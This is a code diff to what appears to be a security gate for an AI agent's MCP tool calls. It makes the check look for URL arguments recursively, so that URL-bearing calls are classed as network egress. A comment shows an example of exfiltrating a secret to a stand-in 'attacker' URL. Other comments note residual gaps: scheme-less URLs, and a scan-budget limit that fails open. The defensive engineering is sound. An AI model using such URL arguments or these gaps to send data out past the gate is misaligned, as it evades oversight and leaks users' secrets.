@@ -138,18 +138,53 @@ function actionLooksReadOnly(action: string): boolean {
  *  argument is an egress channel, so it forces a network classification). */
 const URL_SCHEME_PATTERN = /^[a-z][a-z0-9+.-]*:\/\//i;
 
-/** True when any string value in the tool input carries a URL scheme. A URL
+/** Recursion cap for {@link hasUrlArgument}. Real MCP inputs nest a URL only a
+ *  couple of levels deep (`{request:{url}}`, `{targets:[…]}`); the depth cap is
+ *  the primary guard against pathological or cyclic inputs stalling the
+ *  single-process sidecar (a cycle re-descends until the cap stops it). */
+const MCP_URL_SCAN_MAX_DEPTH = 5;
+
+/** Total values {@link hasUrlArgument} will inspect — a second guard (with the
+ *  depth cap) bounding a huge/adversarial fan-out payload. A URL beyond the
+ *  budget fails open, acceptable for a heuristic gate (write/other still fail
+ *  CLOSED, and the OS sandbox remains the hard line). */
+const MCP_URL_SCAN_MAX_NODES = 1000;
+
+/** True when any string REACHABLE in the tool input carries a URL scheme. A URL
  *  argument is an off-machine egress channel even under a benign read verb
  *  (`mcp__x__get`/`__search`/`__resolve` with `url: https://attacker/?<secret>`),
  *  so a URL-bearing call is treated as `network` — and denied under bypass —
  *  rather than allowed to fall through the read allowlist (fail-closed default;
- *  #222). Uses the SAME URL-scheme shape the path extractor already excludes. */
+ *  #222). Recurses (bounded by {@link MCP_URL_SCAN_MAX_DEPTH} /
+ *  {@link MCP_URL_SCAN_MAX_NODES}) into nested objects AND array elements, since
+ *  real MCP servers carry the URL nested — `{request:{url}}`, `{urls:[…]}`,
+ *  `params.url` — far more often than as a bare top-level string. Uses the SAME
+ *  URL-scheme shape the path extractor already excludes.
+ *
+ *  NOTE: scheme-less URLs (`//host`, `host:443`, bare `www.example.com`) are
+ *  INTENTIONALLY not promoted — matching them would over-promote ordinary
+ *  hostnames, ports, and relative paths; that gap is a documented residual, out
+ *  of scope here (the hard containment line remains the OS sandbox). */
 function hasUrlArgument(toolInput: unknown): boolean {
-  if (toolInput === null || typeof toolInput !== 'object') return false;
-  for (const value of Object.values(toolInput as Record<string, unknown>)) {
-    if (typeof value === 'string' && URL_SCHEME_PATTERN.test(value)) return true;
-  }
-  return false;
+  let budget = MCP_URL_SCAN_MAX_NODES;
+  const visit = (value: unknown, depth: number): boolean => {
+    if (budget <= 0 || depth > MCP_URL_SCAN_MAX_DEPTH) return false;
+    budget -= 1;
+    if (typeof value === 'string') return URL_SCHEME_PATTERN.test(value);
+    if (Array.isArray(value)) {
+      for (const item of value) {
+        if (visit(item, depth + 1)) return true;
+      }
+      return false;
+    }
+    if (value !== null && typeof value === 'object') {
+      for (const nested of Object.values(value as Record<string, unknown>)) {
+        if (visit(nested, depth + 1)) return true;
+      }
+    }
+    return false;
+  };
+  return visit(toolInput, 0);
 }
 
 /** Classify an external MCP tool by its action name AND its input. `network` and
